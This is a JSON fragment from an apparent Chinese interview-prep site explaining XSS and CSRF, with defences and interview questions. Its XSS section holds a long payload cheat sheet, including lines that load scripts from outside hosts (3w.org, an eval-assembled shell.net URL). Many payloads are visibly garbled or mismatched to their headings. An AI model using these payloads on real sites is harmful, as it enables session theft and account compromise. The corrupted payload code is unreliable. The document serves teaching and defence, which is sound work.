    "explanation": "## 一、简述\n\n跨站脚本（Cross-site scripting，简称为：CSS, 但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，跨站脚本攻击缩写为XSS）是一种网站应用程序的安全漏洞攻击。\n\nXSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、 LiveScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。\n\n## 二、XSS类型\n\n最常见的几种分类：**反射型（非持久型）XSS**、**存储型（持久型）XSS**、**DOM型XSS**、**通用型XSS**、**突变型XSS**。\n\n### 反射型XSS\n\n反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。\n\n举例来说，当一个网站的代码中包含类似下面的语句:\n\n```php\n\n<?php echo \"<p>hello,$_GET['user']</p>\"; ?>\n\n```\n\n如果未做防范XSS，用户名设为`<script>alert(\"Tz\")</script>`,则会执行预设好的JavaScript代码。\n\n#### 漏洞成因\n\n当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种：\n\n-   将不可信数据插入到HTML标签之间时；// 例如div, p, td；\n    \n-   将不可信数据插入到HTML属性里时；// 例如：`<div width=$INPUT></div>`\n    \n-   将不可信数据插入到SCRIPT里时；// 例如：`<script>var message = ” $INPUT “;</script>`\n    \n-   还有插入到Style属性里的情况，同样具有一定的危害性；// 例如`<span style=” property : $INPUT ”></span>`\n    \n-   将不可信数据插入到HTML URL里时，// 例如：`<a href=”[http://www.abcd.com?param=](http://www.ccc.com/?param=) $INPUT ”></a>`\n    \n-   使用富文本时，没有使用XSS规则引擎进行编码过滤。\n    \n\n**对于以上的几个场景，若服务端或者前端没有做好防范措施，就会出现漏洞隐患。**\n\n#### 攻击流程\n\n反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。\n\n![](https://static.ecool.fun//article/4b0b76eb-4e3e-434a-847f-9397f5fb44b4.awebp)\n\n### 存储型XSS\n\n​ 存储型（或 HTML 注入型/持久型）XSS 攻击最常发生在由社区内容驱动的网站或 Web 邮件网站，不需要特制的链接来执行。黑客仅仅需要提交 XSS 漏洞利用代码（反射型XSS通常只在url中）到一个网站上其他用户可能访问的地方。这些地区可能是`博客评论，用户评论，留言板，聊天室，HTML 电子邮件，wikis`，和其他的许多地方。一旦用户访问受感染的页，执行是自动的。\n\n#### 漏洞成因\n\n​ 存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。\n\n#### 攻击流程\n\n![](https://static.ecool.fun//article/bf9dde74-be6a-4fcf-9ece-0621c218d318.awebp)\n\n### DOM型XSS\n\n通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。\n\n#### 漏洞成因\n\nDOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。\n\n#### 攻击示例\n\n```html\n<html>\n    <head>\n        <title>DOM Based XSS Demo</title>\n        <script>\n        function xsstest()\n        {\n        var str = document.getElementById(\"input\").value;\n        document.getElementById(\"output\").innerHTML = \"<img\n        src='\"+str+\"'></img>\";\n        }\n        </script>\n    </head>\n    <body>\n    <div id=\"output\"></div>\n    <input type=\"text\" id=\"input\" size=50 value=\"\" />\n    <input type=\"button\" value=\"submit\" onclick=\"xsstest()\" />\n    </body>\n</html>\n\n```\n\n在这段代码中，submit按钮的onclick事件调用了xsstest()函数。而在xsstest()中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作HTML写入到页面中，造成了DOM Based XSS。\n\n### 通用型XSS\n\n通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。\n\n上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。\n\n#### 漏洞成因\n\nWeb浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。\n\n不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。\n\n#### 漏洞案例\n\n##### IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞\n\n这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。\n\n案例详见: [Acrobat插件中的UXSS报告](https://blog.jeremiahgrossman.com/2007/01/what-you-need-to-know-about-uxss-in.html \"https://blog.jeremiahgrossman.com/2007/01/what-you-need-to-know-about-uxss-in.html\")\n\n##### Flash Player UXSS 漏洞 – CVE-2011-2107\n\n一个在2011年Flash Player插件（当时的所有版本）中的缺陷使得攻击者通过使用构造的.swf文件，可以访问Gmail设置和添加转发地址。因此攻击者可以收到任意一个被攻破的Gmail帐号的所有邮件副本（发送的时候都会抄送份）。Adobe承认了该漏洞.\n\n案例详见: [Flash Player UXSS 漏洞 – CVE-2011-2107报告](http://www.adobe.com/support/security/bulletins/apsb11-13.html \"http://www.adobe.com/support/security/bulletins/apsb11-13.html\")\n\n移动设备也不例外，而且可以成为XSS攻击的目标。Chrome安卓版存在一个漏洞，允许攻击者将恶意代码注入到Chrome通过Intent对象加载的任意的web页面。\n\n##### 安卓版Chrome浏览器漏洞\n\n案例详见: [Issue 144813: Security: UXSS via com.android.browser.application\\_id Intent extra](https://code.google.com/p/chromium/issues/detail?id=144813 \"https://code.google.com/p/chromium/issues/detail?id=144813\")\n\n### 突变型XSS\n\n突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation）\n\n#### 漏洞成因\n\n然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。\n\n随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。\n\n#### 攻击流程\n\n​ 将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。\n\n##### mXSS种类\n\n目前为止已知的mXSS种类，接下来的部分将分别对这几类进行讨论与说明。\n\n-   反引号打破属性边界导致的 mXSS；（该类型是最早被发现并利用的一类mXSS，于2007年被提出，随后被有效的修复）\n    \n-   未知元素中的xmlns属性所导致的mXSS；（一些浏览器不支持HTML5的标记，例如IE8，会将article，aside，menu等当作是未知的HTML标签。）\n    \n-   CSS中反斜线转义导致的mXSS；（在CSS中，允许用\\\\来对字符进行转义，例如：`property: 'v\\61 lue'` 表示 `property:'value'`，其中61是字母a的ascii码（16进制）。\\\\后也可以接unicode，例如：\\\\20AC 表示 € 。正常情况下，这种转义不会有问题。但是碰上innerHTML后，一些奇妙的事情就会发生。）\n    \n-   CSS中双引号实体或转义导致的mXSS；（接着上一部分，依然是CSS中所存在的问题，`&quot;` `&#x22;` `&#34;` 等双引号的表示形式均可导致这类问题，）\n    \n-   CSS属性名中的转义所导致的mXSS；\n    \n-   非HTML文档中的实体突变；\n    \n-   HTML文档中的非HTML上下文的实体突变；\n    \n\n## 三、XSS攻击代码出现的场景\n\n-   **普通的XSS JavaScript注入**，示例如下：\n    \n    ```xml\n    <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>\n    ```\n    \n-   **IMG标签XSS使用JavaScript命令**，示例如下：\n    \n    ```xml\n    <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>\n    ```\n    \n-   **IMG标签无分号无引号**，示例如下：\n    \n    ```css\n    <IMG SRC=javascript:alert(‘XSS’)>\n    ```\n    \n-   **IMG标签大小写不敏感**，示例如下：\n    \n    ```css\n    <IMG SRC=JaVaScRiPt:alert(‘XSS’)>\n    ```\n    \n-   **HTML编码(必须有分号)**，示例如下：\n    \n    ```css\n    <IMG SRC=javascript:alert(“XSS”)>\n    ```\n    \n-   **修正缺陷IMG标签**，示例如下：\n    \n    ```xml\n    <IMG “”\"><SCRIPT>alert(“XSS”)</SCRIPT>”>\n    ```\n    \n-   **formCharCode标签**，示例如下：\n    \n    ```css\n    <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\n    ```\n    \n-   **UTF-8的Unicode编码**，示例如下：\n    \n    ```css\n    <IMG SRC=jav..省略..S')>\n    ```\n    \n-   **7位的UTF-8的Unicode编码是没有分号的**，示例如下：\n    \n    ```css\n    <IMG SRC=jav..省略..S')>\n    ```\n    \n-   **十六进制编码也是没有分号**，示例如下：\n    \n    ```css\n    <IMG SRC=\\'#\\'\" /span>\n    ```\n    \n-   **嵌入式标签,将Javascript分开**，示例如下：\n    \n    ```css\n    <IMG SRC=\\'#\\'\" ascript:alert(‘XSS’);”>\n    ```\n    \n-   **嵌入式编码标签,将Javascript分开**，示例如下：\n    \n    ```css\n    <IMG SRC=\\'#\\'\" ascript:alert(‘XSS’);”>\n    ```\n    \n-   **嵌入式换行符**，示例如下：\n    \n    ```css\n    <IMG SRC=\\'#\\'\" ascript:alert(‘XSS’);”>\n    ```\n    \n-   **嵌入式回车**，示例如下：\n    \n    ```css\n    <IMG SRC=\\'#\\'\" ascript:alert(‘XSS’);”>\n    ```\n    \n-   **嵌入式多行注入JavaScript,这是XSS极端的例子**，示例如下：\n    \n    ```css\n    <IMG SRC=\\'#\\'\" /span>\n    ```\n    \n-   **解决限制字符(要求同页面)**，示例如下：\n    \n    ```javascript\n          <script>z=z+ ’write(“‘</script>\n    \n          <script>z=z+ ’<script’</script>\n    \n          <script>z=z+ ’ src=ht’</script>\n    \n          <script>z=z+ ’tp://ww’</script>\n    \n          <script>z=z+ ’w.shell’</script>\n    \n          <script>z=z+ ’.net/1.’</script>\n    \n          <script>z=z+ ’js></sc’</script>\n    \n          <script>z=z+ ’ript>”)’</script>\n    \n          <script>eval_r(z)</script>\n    \n    ```\n    \n-   **空字符**，示例如下：\n    \n    ```css\n          perl -e ‘print “<IMG SRC=java\\0script:alert(\\”XSS\\”)>”;’ > out\n    ```\n    \n-   **空字符2,空字符在国内基本没效果.因为没有地方可以利用**，示例如下：\n    \n    ```scss\n          perl -e ‘print “<SCR\\0IPT>alert(\\”XSS\\”)</SCR\\0IPT>”;’ > out\n    ```\n    \n-   **Spaces和meta前的IMG标签**，示例如下：\n    \n    ```css\n    <IMG SRC=\\'#\\'\"  \n    \n    javascript:alert(‘XSS’);”>\n    ```\n    \n-   **Non-alpha-non-digit XSS**，示例如下：\n    \n    ```css\n    <SCRIPT/XSS SRC=\\'#\\'\" /span>http://3w.org/XSS/xss.js”></SCRIPT>\n    ```\n    \n-   **Non-alpha-non-digit XSS to 2**，示例如下：\n    \n    ```css\n    <BODY onload!#$%&()*~+ -_.,:;?@[/|\\]^`=alert(“XSS”)>\n    ```\n    \n-   **Non-alpha-non-digit XSS to 3**，示例如下：\n    \n    ```css\n    <SCRIPT/SRC=\\'#\\'\" /span>http://3w.org/XSS/xss.js”></SCRIPT>\n    ```\n    \n-   **双开括号**，示例如下：\n    \n    ```xml\n    <<SCRIPT>alert(“XSS”);//<</SCRIPT>\n    ```\n    \n-   **无结束脚本标记(仅火狐等浏览器)**，示例如下：\n    \n    ```xml\n    <SCRIPT SRC=http://3w.org/XSS/xss.js?<B>\n    ```\n    \n-   **无结束脚本标记2**，示例如下：\n    \n    ```xml\n    <SCRIPT SRC=//3w.org/XSS/xss.js>\n    ```\n    \n-   **半开的HTML/JavaScript XSS**，示例如下：\n    \n    ```css\n    <IMG SRC=\\'#\\'\" /span>\n    ```\n    \n-   **双开角括号**，示例如下：\n    \n    ```css\n    <iframe src=http://3w.org/XSS.html <\n    ```\n    \n-   **无单引号 双引号 分号**，示例如下：\n    \n    ```xml\n    <SCRIPT>a=/XSS/\n    alert(a.source)</SCRIPT>\n    ```\n    \n-   **换码过滤的JavaScript**，示例如下：\n    \n    ```scss\n      \\”;alert(‘XSS’);//\n    ```\n    \n-   **结束Title标签**，示例如下：\n    \n    ```xml\n    </TITLE><SCRIPT>alert(“XSS”);</SCRIPT>\n    ```\n    \n-   **Input Image**，示例如下：\n    \n    ```css\n    <INPUT SRC=\\'#\\'\" /span>\n    ```\n    \n-   **BODY Image**，示例如下：\n    \n    ```css\n    <BODY BACKGROUND=”javascript:alert(‘XSS’)”>\n    ```\n    \n-   **BODY标签**，示例如下：\n    \n    ```css\n    <BODY(‘XSS’)>\n    ```\n    \n-   **IMG Dynsrc**，示例如下：\n    \n    ```css\n    <IMG DYNSRC=\\'#\\'\" /span>\n    ```\n    \n-   **IMG Lowsrc**，示例如下：\n    \n    ```css\n    <IMG LOWSRC=\\'#\\'\" /span>\n    ```\n    \n-   **BGSOUND**，示例如下：\n    \n    ```css\n    <BGSOUND SRC=\\'#\\'\" /span>\n    ```\n    \n-   **STYLE sheet**，示例如下：\n    \n    ```ini\n    <LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”>\n    ```\n    \n-   **远程样式表**，示例如下：\n    \n    ```xml\n    <LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”>\n    ```\n    \n-   **List-style-image(列表式)**，示例如下：\n    \n    ```xml\n    <STYLE>li {list-style-image: url(“javascript:alert(‘XSS’)”);}</STYLE><UL><LI>XSS\n    ```\n    \n-   **IMG VBscript**，示例如下：\n    \n    ```css\n    <IMG SRC=\\'#\\'\" /STYLE><UL><LI>XSS\n    ```\n    \n-   **META链接url**，示例如下：\n    \n    ```xml\n    <META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”>\n    ```\n    \n-   **Iframe**，示例如下：\n    \n    ```css\n    <IFRAME SRC=\\'#\\'\" /IFRAME>\n    ```\n    \n-   **Frame**，示例如下：\n    \n    ```xml\n    <FRAMESET><FRAME SRC=\\'#\\'\" /FRAMESET>\n    ```\n    \n-   **Table**，示例如下：\n    \n    ```css\n    <TABLE BACKGROUND=”javascript:alert(‘XSS’)”>\n    ```\n    \n-   **TD**，示例如下：\n    \n    ```css\n    <TABLE><TD BACKGROUND=”javascript:alert(‘XSS’)”>\n    ```\n    \n-   **DIV background-image**，示例如下：\n    \n    ```css\n    <DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>\n    ```\n    \n-   **DIV background-image后加上额外字符(1-32&34&39&160&8192-8&13&12288&65279)**，示例如下：\n    \n    ```css\n    <DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>\n    ```\n    \n-   **DIV expression**，示例如下：\n    \n    ```css\n    <DIV STYLE=”width: expression_r(alert(‘XSS’));”>\n    ```\n    \n-   **STYLE属性分拆表达**，示例如下：\n    \n    ```css\n    <IMG STYLE=”xss:expression_r(alert(‘XSS’))”>\n    ```\n    \n-   **匿名STYLE(组成:开角号和一个字母开头)**，示例如下：\n    \n    ```css\n    <XSS STYLE=”xss:expression_r(alert(‘XSS’))”>\n    ```\n    \n-   **STYLE background-image**，示例如下：\n    \n    ```xml\n    <STYLE>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</STYLE><A CLASS=XSS></A>\n    ```\n    \n-   **IMG STYLE方式**，示例如下：\n    \n    ```scss\n      exppression(alert(“XSS”))’>\n    ```\n    \n-   **STYLE background**，示例如下：\n    \n    ```xml\n    <STYLE><STYLE type=”text/css”>BODY{background:url(“javascript:alert(‘XSS’)”)}</STYLE>\n    ```\n    \n-   **BASE**，示例如下：\n    \n    ```ini\n    <BASE HREF=”javascript:alert(‘XSS’);//”>\n    ```\n    \n\n## 四、XSS 攻击的预防\n\n网上防范XSS攻击的方法一搜就一大堆，但是无论方法有多少，始终是万变不离其宗。\n\n**XSS 攻击有两大要素： 1. 攻击者提交恶意代码。 2. 浏览器执行恶意代码。**\n\n### 1.预防 DOM 型 XSS 攻击\n\nDOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。\n\n在使用 `.innerHTML、.outerHTML、document.write()` 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 `.textContent、.setAttribute()` 等。\n\nDOM 中的内联事件监听器，如 `location、onclick、onerror、onload、onmouseover` 等， 标签的`href`属性，JavaScript 的`eval()、setTimeout()、setInterval()`等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易 产生安全隐患，请务必避免。\n\n### 2.输入过滤\n\n如果由前端过滤输入，然后提交到后端的话。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。\n\n那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？ 我们举一个例子，一个正常的用户输入了 5 < 7 这个内容，在写入数据库前，被转义，变成了 5 `$lt;` 7。 问题是：在提交阶段，我们并不确定内容要输出到哪里。\n\n这里的“并不确定内容要输出到哪里”有两层含义：\n\n1.  用户的输入内容可能同时提供给前端和客户端，而一旦经过了 escapeHTML()，客户端显示的内容就变成了乱码( 5 `$lt;`7 )。\n2.  在前端中，不同的位置所需的编码也不同。 当 5 `$lt;`7 作为 HTML 拼接页面时，可以正常显示：`5 < 7`\n\n所以输入过滤非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS，可采用下面的两种方法\n\n### 3.前端渲染把代码和数据分隔开\n\n在前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式 （.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。\n\n-   Javascript：可以使用textContent或者innerText的地方，尽量不使用innerHTML；\n    \n-   query：可以使用text()得地方，尽量不使用html()；\n    \n\n### 4.拼接HTML时对其进行转义\n\n如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。\n\n常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 & < > \" ' / 这几个字符转义掉，确 实能起到一定的 XSS 防护作用，但并不完善：\n\n这里推荐一个前端防止XSS攻击的插件: [js-xss的使用和源码解读](https://juejin.cn/post/6913344728515739661 \"https://juejin.cn/post/6913344728515739661\")，Git 3.8K 的Star和60W的周下载量证明了其强大性.\n\n## 五、总结\n\n防范 XSS 是不只是服务端的任务，需要后端和前端共同参与的系统工程。虽然很难通过技术手段完全避免XSS，但我们原则上减少漏洞的产生。\n",
    "testPoint": "### **1. XSS 的基本概念**\n#### **问题**：\n   - 什么是 XSS？为什么会发生？\n   - XSS 攻击的主要目标是什么？它对网站和用户可能造成哪些危害？\n   - XSS 和 CSRF 有什么区别？\n\n---\n\n### **2. XSS 的分类**\n#### **问题**：\n   - **存储型 XSS**：\n     - 什么是存储型 XSS？它的攻击过程是什么？\n     - 能否举例说明存储型 XSS 的常见场景？\n   - **反射型 XSS**：\n     - 什么是反射型 XSS？与存储型 XSS 的主要区别是什么？\n     - 常见的反射型 XSS 攻击点在哪里？\n   - **DOM 型 XSS**：\n     - 什么是 DOM 型 XSS？它与存储型和反射型的区别是什么？\n     - DOM 型 XSS 的常见场景有哪些？\n   - **问题延展**：\n     - 哪种 XSS 的危害最大？为什么？\n     - 你是否了解混合型 XSS？它是如何运作的？\n\n---\n\n### **3. XSS 的触发场景**\n#### **问题**：\n   - 在用户输入的数据没有被过滤的情况下，哪些地方容易受到 XSS 攻击？\n     - 例如：HTML 标签内、属性值、事件处理器、URL、CSS、JSON。\n   - 什么是基于 `<script>` 注入的 XSS？它与其他标签注入（如 `<img>`）有什么不同？\n   - 在现代框架（如 React、Vue）中，是否可能出现 XSS？如果可能，请举例说明。\n\n---\n\n### **4. XSS 的检测与分析**\n#### **问题**：\n   - 如何在代码审查过程中识别潜在的 XSS 漏洞？\n   - 有哪些自动化工具可以用来检测 XSS 漏洞？如 Burp Suite、OWASP ZAP。\n   - 你在实际项目中如何测试页面是否存在 XSS 漏洞？（例如输入 `<script>alert(1)</script>`）\n\n---\n\n### **5. XSS 的防御手段**\n#### **问题**：\n   - **编码与过滤**：\n     - 什么是输入过滤和输出编码？为什么都很重要？\n     - 对于不同的上下文（HTML、属性、URL、JavaScript 等），如何进行输出编码？\n     - 使用 `encodeURIComponent` 和 `escape` 时，需要注意哪些问题？\n   - **内容安全策略（CSP）**：\n     - 什么是 CSP？它是如何防御 XSS 的？\n     - 如何配置 CSP？有哪些常见的错误配置？\n   - **防止 DOM 型 XSS**：\n     - 为什么不推荐使用 `innerHTML` 等 API？\n     - 安全替代方案有哪些（如 `textContent`、`setAttribute`）？\n   - **现代框架的内置防护**：\n     - React、Vue 等框架如何默认防御 XSS？\n     - 使用这些框架时，是否有场景需要开发者特别注意？\n   - **其他防御策略**：\n     - 什么是 HTTP-only Cookie？它与 XSS 防御有什么关系？\n     - 如何利用 Subresource Integrity（SRI）防御第三方资源中的恶意代码？\n\n---\n\n### **6. 真实场景问题**\n#### **问题**：\n   - 如果用户评论模块允许输入富文本，如何防止 XSS？\n   - 如果你接手了一个老旧项目，发现有直接渲染用户输入到页面的行为，你会如何处理？\n   - 某个功能需要动态生成一段 HTML 并插入页面，你会如何保证安全性？\n   - 如果项目中需要支持 Markdown 渲染，如何防止 XSS 攻击？\n\n---\n\n### **7. XSS 与现代开发的结合**\n#### **问题**：\n   - 为什么说 XSS 攻击在现代 Web 应用中依然普遍存在？\n   - 前后端分离的架构下，XSS 攻击是否更容易？如何防御？\n   - WebSocket 和 SSE 是否可能受到 XSS 攻击？如何防御？\n\n---\n\n### **8. XSS 攻击演示与防御演练**\n#### **问题**：\n   - 设计一个简单的场景，让候选人模拟如何通过 XSS 攻击获取 Cookie。\n   - 给出一段含漏洞的代码片段，要求候选人分析并修复：\n     ```javascript\n     const query = location.search;\n     document.body.innerHTML = `<div>${query}</div>`;\n     ```\n   - 如果提供一个含有 XSS 漏洞的页面，如何快速验证攻击是否成功？\n\n---\n\n### **9. 项目实践经验**\n#### **问题**：\n   - 你在项目中是否遇到过 XSS 漏洞？是如何发现并修复的？\n   - 有哪些工具或库可以帮助你防御 XSS？你最推荐哪种？\n   - 如果团队中有人忽略了安全问题导致 XSS 漏洞，你会如何推动安全意识？\n\n---\n\n### **10. 安全意识与责任**\n#### **问题**：\n   - XSS 是一种用户行为可能引发的攻击，那么防御 XSS 是开发者、测试人员还是安全团队的责任？\n   - 除了 XSS，你认为前端开发还应该关注哪些安全问题？\n",
    "exerciseKeyList": "[\"0958b45c-a5b9-4087-9431-e0ca02ff0597\",\"947278fd-7485-4e8c-a704-83d48280e05a\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-10-02T02:54:42.000Z",
    "updateAt": "2024-12-03T14:20:03.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "0958b45c-a5b9-4087-9431-e0ca02ff0597",
        "title": "说说你对 XSS 的了解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:54:42.000Z",
        "updateAt": "2024-08-10T17:04:57.000Z"
      },
      {
        "exerciseKey": "947278fd-7485-4e8c-a704-83d48280e05a",
        "title": "web常见的攻击方式有哪些，以及如何进行防御？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T14:06:33.000Z",
        "updateAt": "2024-08-10T17:04:36.000Z"
      }
    ]
  },
  "33": {
    "id": 33,
    "tagId": 21,
    "title": "CSRF攻击",
    "explanation": "## CSRF是什么\n\nCSRF（Cross-site request forgery）跨站请求伪造：**攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求，利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。**\n\n一个典型的CSRF攻击有着如下的流程：\n\n-   受害者登录a.com，并保留了登录凭证（Cookie）。\n-   攻击者引诱受害者访问了b.com。\n-   b.com 向 a.com 发送请求。\n-   a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。\n-   a.com以受害者的名义执行了这个请求。\n-   攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。\n\n## CSRF的特点\n\n-   **攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生**\n-   **攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据**\n-   **整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”**\n-   **跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。**\n\n## 如何进行预防\n\n**CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。**\n\n防止`csrf`常用方案如下：\n\n-   阻止不明外域的访问\n    \n    -   同源检测\n    -   Samesite Cookie\n-   提交时要求附加本域才能获取的信息\n    \n    -   CSRF Token\n    -   双重Cookie验证\n\n### 同源检测\n\nCookie的同源和浏览器的同源策略有所区别：\n\n-   浏览器同源策略：协议、域名和端口都相同即同源；\n-   Cookie同源策略：域名相同即同源；\n\n在HTTP协议中，每个异步请求都会携带两个header,用来标记来源域名：\n\n-   Origin Header\n-   Referer Header\n\n**这两个Header在浏览器发起请求时，大多数情况会自动带上，并且不能由前端修改，服务器接收到后可以根据这两个Header确定来源的域名；**\n\n**综上所述：** 同源验证是一个相对简单的防范方法，能够防范绝大多数的CSRF攻击。但这并不是万无一失的，**对于安全性要求较高，或者有较多用户输入内容的网站，我们就要对关键的接口做额外的防护措施。**\n\n### Samesite Cookie属性\n\n在**Chrome 51**版本后，浏览器的 Cookie 新增加了一个SameSite属性，用来防止 CSRF 攻击。\n\nCookie的Samesite属性用来限制第三方Cookie, 从而减少安全风险，它有三个值：\n\n-   Set-Cookie: SameSite = Strict;\n-   Set-Cookie: SameSite = Lax;\n-   Set-Cookie: SameSite = None;\n\n**Strict：** 最为严格，完全禁止第三方Cookie, 跨站点时，任何情况都不发送Cookie;\n\n**Lax：** 限制稍微宽松，大多数情况下时不发送第三方Cookie的，除了a链接、预加载请求和GET表单；\n\n**None：** 关闭`SameSite`属性，但必须同时设置`Secure`属性，\n\n### CSRF token\n\nCSRF token的防护策略分为三步：\n\n1.  将token输出到页面 首先，用户打开页面的时候，服务器需要给这个用户生成一个Token，该Token通过加密算法对数据进行加密，一般Token都包括随机字符串和时间戳的组合，显然在提交时Token不能再放在Cookie中了，否则又会被攻击者冒用。\n    \n2.  请求中携带token\n    \n3.  服务端验证token是否正确 服务端拿到客户端给的token后，先解密token,再比对随机字符串是否一致、时间是否有效，如果字符串对比一致且在有效期内，则说明token正确。",
    "testPoint": "### **1. CSRF 的基本概念**\n#### **问题**：\n   - 什么是 CSRF？它的攻击流程是怎样的？\n   - CSRF 和 XSS 有什么区别？在实际场景中如何区分？\n   - 为什么 CSRF 攻击能够成功？需要满足哪些条件？\n\n---\n\n### **2. CSRF 的原理分析**\n#### **问题**：\n   - CSRF 的攻击依赖哪些机制（如浏览器的同源策略、自动携带 Cookie 等）？\n   - 为什么说 CSRF 是一种“跨站”攻击？\n   - 在 POST 和 GET 请求中，CSRF 的实现方式是否有区别？如果有，请详细说明。\n\n---\n\n### **3. CSRF 的攻击场景**\n#### **问题**：\n   - 能否举例说明 CSRF 攻击的常见场景？如恶意转账、修改用户资料。\n   - 在单点登录（SSO）中，CSRF 攻击可能会带来什么危害？\n   - 如果网站使用了跨域资源共享（CORS），是否会增加 CSRF 的风险？为什么？\n\n---\n\n### **4. CSRF 的检测**\n#### **问题**：\n   - 如何发现系统中存在 CSRF 漏洞？\n   - 有哪些自动化工具可以用来检测 CSRF 漏洞？例如：Burp Suite、OWASP ZAP。\n   - 在代码审查中，如何识别可能存在的 CSRF 风险？\n\n---\n\n### **5. CSRF 的防御方法**\n#### **问题**：\n##### **1. CSRF Token 防御**\n   - 什么是 CSRF Token？它的原理是什么？\n   - CSRF Token 应该如何生成和验证？\n   - 在单页应用（SPA）中，如何实现 CSRF Token 的防护？\n   - CSRF Token 是否可以存储在 Cookie 中？为什么？\n\n##### **2. Referer / Origin 检查**\n   - 什么是 Referer？如何通过它防御 CSRF？\n   - Origin 和 Referer 有什么区别？在防御 CSRF 时，哪个更可靠？\n   - 如果浏览器未发送 Referer 